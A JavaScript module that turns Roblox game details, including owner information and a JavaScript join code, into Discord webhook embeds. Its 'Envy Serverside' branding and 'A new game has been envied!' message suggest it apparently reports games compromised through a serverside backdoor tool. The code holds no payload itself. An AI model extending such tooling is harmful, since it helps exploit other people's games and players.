const { MAX_DESCRIPTION_LENGTH } = require('./config');

function formatNumber(n) {
    n = parseInt(n);
    if (isNaN(n)) return "Unknown";
    return n >= 1e6 ? `${(n / 1e6).toFixed(1)}M`
        : n >= 1e3 ? `${(n / 1e3).toFixed(1)}K`
        : n.toString();
}

function formatDate(dateString) {
    try {
        const date = new Date(dateString);
        const now = new Date();
        const diffMs = now - date;
        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
        const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
        const diffMinutes = Math.floor(diffMs / (1000 * 60));

        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');
        const year = date.getFullYear();
        const absoluteDate = `${month}/${day}/${year}`;

        let relativeTime;
        if (diffMinutes < 60) {
            relativeTime = `${diffMinutes} minute${diffMinutes !== 1 ? 's' : ''} ago`;
        } else if (diffHours < 24) {
            relativeTime = `${diffHours} hour${diffHours !== 1 ? 's' : ''} ago`;
        } else {
            relativeTime = `${diffDays} day${diffDays !== 1 ? 's' : ''} ago`;
        }

        return `${relativeTime} (${absoluteDate})`;
    } catch (e) {
        return "Unknown";
    }
}

function createDiscordEmbed(gameInfo, placeId, thumbnail, JobId, isNonHttp = false, components = []) {
    let creator = "";
    if (gameInfo.creator.type === "User") {
        creator = `:man_police_officer: **Owner**: [${gameInfo.creator.name}](https://www.roblox.com/users/${gameInfo.creator.id || 0}/profile)\n` +
                  `:identification_card: **ID**: \`${gameInfo.creator.id}\`\n` +
                  `:ballot_box_with_check: **Verified**: \`${gameInfo.creator.hasVerifiedBadge}\``;
    } else {
        creator = `:police_car: **Owner**: [${gameInfo.creator.name}](https://www.roblox.com/communities/${gameInfo.creator.id || 0})`;
    }

    let description = gameInfo.description || "No description";
    if (description.length > MAX_DESCRIPTION_LENGTH) {
        description = description.slice(0, MAX_DESCRIPTION_LENGTH) + '...';
    }

    return {
        content: "",
        username: "Envy Messenger",
        avatar_url: "https://i.ibb.co/TMQbDpH8/image.png",
        embeds: [{
            title: gameInfo.name,
            url: `https://www.roblox.com/games/${placeId}`,
            color: parseInt("0x8200c8", 16),
            author: {
                name: "A new game has been envied!",
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png"
            },
            thumbnail: { url: thumbnail },
            fields: [
                {
                    name: "> **Game Information**",
                    value: `:busts_in_silhouette: **Players**: \`${gameInfo.playing}\`\n` +
                           `:desktop: **Server Size**: \`${gameInfo.maxPlayers || "Unknown"}\`\n` +
                           `:eye_in_speech_bubble: **Visits**: \`${formatNumber(gameInfo.visits)}\`\n` +
                           `:star: **Favorites**: \`${formatNumber(gameInfo.favoritedCount)}\`\n` +
                           `:crossed_swords: **Genre**: \`${gameInfo.genre}\`\n` +
                           `:notepad_spiral: **Description**: \`\`\`${description}\`\`\`\n` +
                           `:date: **Last Game Update**: \`${formatDate(gameInfo.updated)}\`\n` +
                           `:zap: **Javascript Join Code**: \`\`\`js\nRoblox.GameLauncher.joinGameInstance(${placeId}, "${JobId}")\`\`\`\n`+ (isNonHttp ?  
                           `\n## :warning: WARNING: This game is non-HTTP Enabled and may provide inaccurate data.` : ""),
                    inline: true
                },
                {
                    name: "> **Owner Information**",
                    value: creator,
                    inline: true
                }
            ],
            footer: {
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png",
                text: "Envy Serverside"
            },
            timestamp: new Date().toISOString()
        }],
        components
    };
}

module.exports = { createDiscordEmbed };
